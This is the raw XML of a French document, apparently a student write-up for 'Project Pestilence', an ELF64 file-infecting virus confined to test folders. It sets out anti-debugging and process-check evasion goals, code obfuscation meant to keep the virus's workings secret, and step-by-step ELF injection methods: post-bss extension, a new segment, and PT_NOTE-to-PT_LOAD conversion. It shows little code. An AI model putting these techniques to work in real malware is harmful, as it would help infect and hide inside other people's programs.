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FC600001F6C07F19DB8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003521000010066C77F394.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000543D000037EBEC305A51.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000334400000600548B89E1.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004314000007C13BB3268E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000334400000600DF12C672.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002AE5000012322697B67D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000214900000E94314441E8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000053ED0000151720700E6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Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>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paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:text-underline-style="none" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P7"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background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#6a9955" style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d4d4d4" style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" fo:font-style="normal" style:text-underline-style="none" style:font-size-asian="10pt" style:font-style-asian="normal" style:font-size-complex="10pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" fo:font-style="normal" style:font-size-asian="10pt" style:font-style-asian="normal" style:font-size-complex="10pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#dcdcaa" style:font-name="Courier New" fo:font-size="10pt" fo:font-style="normal" style:text-underline-style="none" style:font-size-asian="10pt" style:font-style-asian="normal" style:font-size-complex="10pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#dcdcaa" style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>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list-style-name="L6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L5">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L7">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P2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1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list-style-name="L11">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:text-underline-style="none" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L9">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L16">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>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0" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P31"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32" style:family="paragraph" style:parent-style-name="Standard"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33" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L8">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L18">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard"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6" style:family="paragraph" style:parent-style-name="Standard"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7" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L15">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8" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L17">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40" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L14">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text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#6a9955"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background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d4d4d4" style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>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background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#569cd6" style:font-name="Courier New"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1pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="10.5pt" fo:font-weight="normal" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt"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color="#569cd6"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:color="#569cd6" style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:color="#dcdcaa"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:color="#dcdcaa" style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:color="#d4d4d4"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#6a9955"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#b5ce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 Project Pestilence</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">&gt;&gt; <text:span text:style-name="T1">INTRODUCTION</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Le but de ce projet était de poursuivre la rédaction de notre virus entamée par le projet <text:span text:style-name="T1">famine</text:span><text:span text:style-name="T2">. L'idée de pestilence était, exactement comme famine, de rajouter une signature aux fichiers ELF64 d'un dossier spécifique (</text:span><text:span text:style-name="T3">/tmp/test</text:span><text:span text:style-name="T2"> et </text:span><text:span text:style-name="T3">/tmp/test2</text:span><text:span text:style-name="T2">) :</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P4">Pestilence version 1.0 (c)oded by qroland</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">De même que pour famine, le comportement originel du fichier ne doit pas changer, et le fichier infecté doit lui-même exécuter le virus qui l'a infecté (voir doc famine pour les détails).</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">La différence ici et l'intérêt du projet <text:span text:style-name="T1">pestilence </text:span><text:span text:style-name="T2">est d'opérer une </text:span><text:span text:style-name="T1">obfuscation</text:span><text:span text:style-name="T2"> de notre virus. Il s'agira de le rendre extrêmement discret au sein des fichiers infectés, et de rendre sa compréhension difficile afin de garder son fonctionnement secret.</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">Le sujet exige trois éléments distincts d'obfuscation :</text:p>
      <text:list xml:id="list8972632600325226122" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P17"><text:span text:style-name="T2">Le code du virus ne doit pas s'exécuter si un ou plusieurs </text:span><text:span text:style-name="T1">processus spécifiques</text:span><text:span text:style-name="T2"> sont actifs sur la machine cible.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P17"><text:span text:style-name="T2">Le code du virus ne doit pas s'exécuter si on tente d'utiliser un </text:span><text:span text:style-name="T1">debugger</text:span><text:span text:style-name="T2"> pour lancer le fichier infecté.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P17"><text:span text:style-name="T2">Lorsqu’une modification manuelle sur le virus dans un but de contourner le lancement l’anti-debuging est réalisée, la routine d’infection doit être </text:span><text:span text:style-name="T1">obfuscée partiellement</text:span><text:span text:style-name="T2">. La méthode d'obfuscation est libre, mais doit rendre complexe la lecture et la compréhension du code du virus par une personne physique.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">&gt;&gt; <text:span text:style-name="T1">MÉTHODE D'INFECTION</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">L'insertion d'une routine d'obfuscation va nécessiter l'ajout d'un certain nombre de lignes de code. On ne pourra donc pas conserver la méthode utilisée dans le virus <text:span text:style-name="T1">famine</text:span><text:span text:style-name="T2">, d'injection dans le </text:span><text:span text:style-name="T6">padding gap</text:span><text:span text:style-name="T9"> se situant à la fin du segment texte : notre virus sera trop gros et n'arrivera pas à infecter beaucoup de binaires.</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P2"><text:span text:style-name="T9">La méthode employée dans le virus </text:span><text:span text:style-name="T10">strife</text:span><text:span text:style-name="T9">, reprise de woody-woodpacker, a ses </text:span><text:span text:style-name="T10">limites</text:span><text:span text:style-name="T9"> comme souligné à la fin de la documentation famine. L'</text:span><text:span text:style-name="T6">overlap</text:span><text:span text:style-name="T9"> des adresses virtuelles du segment texte et du segment suivant rend impossible l'infection de certains binaires.</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">Il nous faut donc une méthode d'infection plus efficace, qui nous permette d'avoir l'espace nécessaire afin d'insérer notre virus, sans provoquer d'overlap quelconque. Globalement, trois techniques sont envisageables :</text:p>
      <text:p text:style-name="P22"/>
      <text:list xml:id="list8792227066741353979" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P18"><text:span text:style-name="T10">Post-bss injection</text:span><text:span text:style-name="T9"> : l'idée de cette injection est simplement d'étendre le </text:span><text:span text:style-name="T10">dernier segment LOAD</text:span><text:span text:style-name="T9"> du binaire. En effet, puisqu'il s'agit du dernier segment chargé en mémoire, on peut librement étendre sa taille dans le fichier, sans risquer qu'au chargement du programme, son adresse virtuelle dépasse sur celle du segment suivant.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30"><text:span text:style-name="T8">New segment</text:span><text:span text:style-name="T9"> : l'idée est ici simplement d'ajouter un nouveau segment </text:span><text:span text:style-name="T8">LOAD</text:span><text:span text:style-name="T9"> au binaire.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30"><text:span text:style-name="T8">PT_NOTE infection</text:span><text:span text:style-name="T9"> : cette infection transforme un segment PT_NOTE en segment LOAD et y place notre virus.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P22"/>
      <text:list xml:id="list7008274794679141277" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P31"><text:soft-page-break/>Post-bss injection</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P2">Comme relevé ci-dessus, cette injection est intéressante dans le sens où l'on peut étendre autant que l'on veut le dernier segment LOAD dans le fichier ELF, sans risquer d'overlap au moment du chargement en mémoire. Le dernier segment loadable est généralement (systématiquement ?) le segment qui contient les données du programme, en <text:span text:style-name="T1">R W</text:span><text:span text:style-name="T2">, comprenant notamment la section </text:span><text:span text:style-name="T1">.bss</text:span><text:span text:style-name="T2">, d'où le nom "post-bss".</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">C'est cette méthode qu'on a tenté d'implémenter dans le fichier <text:span text:style-name="T1">backups/pestilence_post_bss.asm</text:span><text:span text:style-name="T2">. On reprend la structure générale de famine, sauf que pour chaque fichier qu'on souhaite infecter :</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">&gt; On cherche le </text:span><text:span text:style-name="T1">dernier segment loadable</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P2"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:x="0.058cm" svg:y="0.169cm" svg:width="13.601cm" svg:height="4.103cm" draw:z-index="0"><draw:image xlink:href="Pictures/2000000700003521000010066C77F394.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">On itère sur tous les <text:span text:style-name="T5">segment headers</text:span><text:span text:style-name="T8">, et à chaque fois on appelle </text:span><text:span text:style-name="T11">_check_loadable</text:span><text:span text:style-name="T12"> qui place l'adresse du </text:span><text:span text:style-name="T7">segment header </text:span><text:span text:style-name="T12">concerné dans </text:span><text:span text:style-name="T11">r12</text:span><text:span text:style-name="T12"> si le segment est de type PT_LOAD.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">&gt; On parse ce dernier segment loadable (on récupère son offset, sa taille...).</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">&gt; On étend le fichier qu'on souhaite infecter de 4096 bytes pour faire de la place pour le virus.</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">&gt; On patch le </text:span><text:span text:style-name="T7">segment header</text:span><text:span text:style-name="T12"> du dernier segment loadable :</text:span></text:p>
      <text:list xml:id="list5225716310637412721" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P19"><text:span text:style-name="T12">On change les permissions en </text:span><text:span text:style-name="T11">R W E</text:span><text:span text:style-name="T12"> (il nous faut le bit </text:span><text:span text:style-name="T11">E</text:span><text:span text:style-name="T12"> pour exécuter le virus, et comme relevé ci-dessus, le dernier segment LOAD est le segment qui contient les données, qui doit donc être en R W).</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P19"><text:span text:style-name="T12">On augmente </text:span><text:span text:style-name="T11">p_filesz</text:span><text:span text:style-name="T12"> et </text:span><text:span text:style-name="T11">p_memsz</text:span><text:span text:style-name="T12"> de VIRUS_SIZE.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">&gt; On patch les </text:span><text:span text:style-name="T7">section headers</text:span><text:span text:style-name="T12"> de toutes les sections qui vont se situer après le point d'injection du virus dans le fichier. En effet, puisqu'on écrit dans le fichier notre virus juste après les données du dernier segment LOAD, il faudra décaler l'intégralité des sections qui se situent après le point d'injection de VIRUS_SIZE. Les </text:span><text:span text:style-name="T7">section headers </text:span><text:span text:style-name="T12">doivent le refléter. La boucle est exactement identique à celle de strife.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">Le point d'injection sera :</text:p>
      <text:p text:style-name="P39">FAM(famine.map_ptr) + FAM(famine.seg_offset) + FAM(famine.seg_filesz)</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">&gt; On patch le </text:span><text:span text:style-name="T11">e_shoff</text:span><text:span text:style-name="T12"> du header elf si les headers de section se situent après le point d'injection, car elles seront décalées aussi.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">&gt; <text:s/>On décale l'intégralité des données situées après le point d'injection dans le fichier, exactement comme dans strife.</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">&gt; On écrit notre virus au point d'injection dans le fichier.</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"><text:soft-page-break/>&gt; On patch les points d'entrée.</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">En exécutant les fichiers infectés, j'avais cependant des </text:span><text:span text:style-name="T11">segmentation faults</text:span><text:span text:style-name="T12"> ou des </text:span><text:span text:style-name="T11">illegal hardware instructions</text:span><text:span text:style-name="T12">. En examinant l'emplacement mémoire où était censé se trouver mon virus, je me suis rendu compte que des </text:span><text:span text:style-name="T11">données du programme </text:span><text:span text:style-name="T12">avaient overwrite le début du virus, ce qui provoquait les fautes mémoire.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">Il se passait en réalité la chose suivante :</text:p>
      <text:list xml:id="list2166316534290462204" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P20"><text:span text:style-name="T12">Le dernier segment LOAD contient la section </text:span><text:span text:style-name="T11">.bss</text:span><text:span text:style-name="T12">. Cette section doit contenir des données non-initialisées du programme. Pour des raisons d'optimisation, les données non-initialisées (des 0 donc) ne sont pas présentes physiquement dans le fichier binaire ; elles sont simplement chargées en mémoire au moment de son exécution (section </text:span><text:span text:style-name="T11">SHT_NOBITS</text:span><text:span text:style-name="T12">). C'est ce qui explique d'ailleurs les différences de </text:span><text:span text:style-name="T11">filesz </text:span><text:span text:style-name="T12">et de </text:span><text:span text:style-name="T11">memsz</text:span><text:span text:style-name="T12"> pour le dernier segment LOAD :</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"><draw:frame draw:style-name="fr2" draw:name="images2" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="1.963cm" draw:z-index="1"><draw:image xlink:href="Pictures/2000000700004314000007C13BB3268E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:list xml:id="list2528946740679758216" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P16">Lorsqu'il sera exécuté, le programme ci-dessus s'attends à ce que l'espace mémoire entre ces deux adresses soit rempli de '0', car il s'agit de l'endroit où il va charger les données non-initialisées qui seront définies au fur et à mesure de l'exécution du programme :</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P41">0x000000000021eff0 + 0x1278</text:p>
      <text:p text:style-name="P41">0x000000000021eff0 + 0x2570</text:p>
      <text:p text:style-name="P15"/>
      <text:list xml:id="list4879041920606173107" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P21"><text:span text:style-name="T2">Le problème, c'est qu'on a inséré notre virus juste après</text:span><text:span text:style-name="T1"> seg_offset + seg_filesz</text:span><text:span text:style-name="T2">. Il va donc se situer justement en plein à l'endroit que le programme va utiliser, lorsqu'il est lancé, pour stocker ses données non-initialisées ! Ce qui ne poserait pas de problème si le programme débutait véritablement par l'exécution du virus, mais parfois la routine de startup utilise des variables </text:span><text:span text:style-name="T1">.bss</text:span><text:span text:style-name="T2">, ce qui provoque l'overwrite de notre virus avant qu'il s'exécute.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">Pour éviter ce problème, il est possible de vérifier si la dernière section du dernier segment LOAD est bien une </text:span><text:span text:style-name="T1">SHT_NOBITS</text:span><text:span text:style-name="T2"> comme la section </text:span><text:span text:style-name="T1">.bss</text:span><text:span text:style-name="T2"> ; et d'</text:span><text:span text:style-name="T1">insérer physiquement dans le fichier</text:span><text:span text:style-name="T2"> les '\0' de cette section, avant d'y insérer notre virus (et de modifier le type de section .bss en PROGBITS). De cette manière, notre virus se situera bien </text:span><text:span text:style-name="T6">après</text:span><text:span text:style-name="T9"> l'emplacement mémoire utilisé par les données du bss lorsque le programme s'exécutera.</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">Expliqué ici :</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="http://beefchunk.com/documentation/sys-programming/binary_formats/elf/format_elf__chevaux_de_troie_binaires.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T9">http://beefchunk.com/documentation/sys-programming/binary_formats/elf/format_elf__chevaux_de_troie_binaires.html</text:span></text:a><text:span text:style-name="T9"> </text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">Implémenté dans ce pestilence :</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://github.com/vsteffen/Pestilence/tree/master/srcs" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T9">https://github.com/vsteffen/Pestilence/tree/master/srcs</text:span></text:a><text:span text:style-name="T9"> </text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22"/>
      <text:list xml:id="list3081118401248263886" text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P33">Insertion d'un nouveau segment</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">L'idée de cette injection était d'essayer d'être le plus propre possible en ajoutant un nouveau segment dédié à notre virus. C'est la méthode d'infection que j'ai tenté d'implémenté dans <text:span text:style-name="T1">backups/pestilence_new_segment.asm</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P22"><text:soft-page-break/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T2">Cette tentative est restée à un stade de prototype, et ne fait que tenter d'ajouter un </text:span><text:span text:style-name="T6">segment header</text:span><text:span text:style-name="T2"> correspondant à notre nouveau segment. Puisque les </text:span><text:span text:style-name="T6">segment headers </text:span><text:span text:style-name="T2">se situent en général tout au début du fichier ELF, suite à l'ajout de mon segment, j'effectue différentes actions :</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:list xml:id="list4239944947309085656" text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P27"><text:span text:style-name="T2">Ajouter le taille d'un </text:span><text:span text:style-name="T6">segment header </text:span><text:span text:style-name="T2">aux offsets de tous les segments.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P27"><text:span text:style-name="T2">Ajouter la taille d'un </text:span><text:span text:style-name="T6">segment header</text:span><text:span text:style-name="T2"> aux offsets de toutes les sections.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P27"><text:span text:style-name="T2">Patch le ELF header (</text:span><text:span text:style-name="T1">shoff</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T1">phnum</text:span><text:span text:style-name="T2">).</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P27"><text:span text:style-name="T2">Écrire tous les </text:span><text:span text:style-name="T6">segment headers</text:span><text:span text:style-name="T2"> du fichier originel dans l'outfile.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P27"><text:span text:style-name="T2">Écrire mon nouveau </text:span><text:span text:style-name="T6">segment header</text:span><text:span text:style-name="T2">.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P23">Écrire tout le reste du fichier.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P5"><text:span text:style-name="T2">Le fichier binaire </text:span><text:span text:style-name="T1">ELF64</text:span><text:span text:style-name="T2"> résultant est bien formé, dans le sens où les commandes </text:span><text:span text:style-name="T1">readelf</text:span><text:span text:style-name="T2"> nous fournissent bien des outputs attendus, avec un nouveau segment comportant les caractéristiques voulues.</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">Cependant, les binaires construits à partir du programme segfaultaient systématiquement, avec un message d'erreur :</text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T2">"</text:span><text:span text:style-name="T4">during startup program terminated with signal sigsegv segmentation fault</text:span><text:span text:style-name="T2">"</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P5"><text:span text:style-name="T2">Un </text:span><text:span text:style-name="T1">strace </text:span><text:span text:style-name="T2">nous révèle que le call </text:span><text:span text:style-name="T1">execve </text:span><text:span text:style-name="T2">échoue avec </text:span><text:span text:style-name="T1">EINVAL</text:span><text:span text:style-name="T2">, ce qui correspond à un problème avec le segment </text:span><text:span text:style-name="T1">PT_INTERP</text:span><text:span text:style-name="T2">. Apparemment un binaire n'apprécie vraiment pas qu'on bouge ce segment, ce que j'ai pourtant dû faire.</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">J'ai fini par abandonné en examinant un outil qui permet justement d'ajouter un nouveau segment :</text:p>
      <text:p text:style-name="P5"><text:a xlink:type="simple" xlink:href="https://github.com/lief-project/LIEF" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T2">https://github.com/lief-project/LIEF</text:span></text:a><text:span text:style-name="T2"> </text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P5"><text:span text:style-name="T2">J'ai ajouté un segment exécutable avec le script </text:span><text:span text:style-name="T1">backups/lief.py</text:span><text:span text:style-name="T2">, et beaucoup d'actions étaient exécutées, beaucoup de headers déplacés, de même que les adresses virtuelles. Bref, des modifications bien trop complexes à implémenter dans un virus qui est censé s'auto-répliquer.</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22"/>
      <text:list xml:id="list3308496018978150304" text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P32">PT_NOTE infection</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">Cette méthode est étonnamment efficace et simple. Elle est décrite ici :</text:p>
      <text:p text:style-name="P5"><text:a xlink:type="simple" xlink:href="https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T13">https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/</text:span></text:a></text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P24">Pour reprendre les mots de l'article :</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T2">"</text:span><text:span text:style-name="T6">Most ELF binaries [...] have a PT_NOTE segment that can be entirely overwritten without affecting program execution. The same segment can also be transformed into a loadable segment, where executable instructions can be placed</text:span><text:span text:style-name="T2">".</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">Cette infection, qui est la méthode que j'ai finalement implémentée, consiste donc à transformer un segment PT_NOTE présent dans le fichier en segment PT_LOAD, et à y placer notre virus.</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">Les étapes suivies (</text:span><text:span text:style-name="T1">srcs/pestilence_clear.asm</text:span><text:span text:style-name="T2">) :</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">&gt; On cherche le premier segment de type </text:span><text:span text:style-name="T1">PT_NOTE</text:span><text:span text:style-name="T2"> par une loop usuelle :</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P43">; === Prepare to loop through segments (getting e_phoff and e_phnum) ===</text:p>
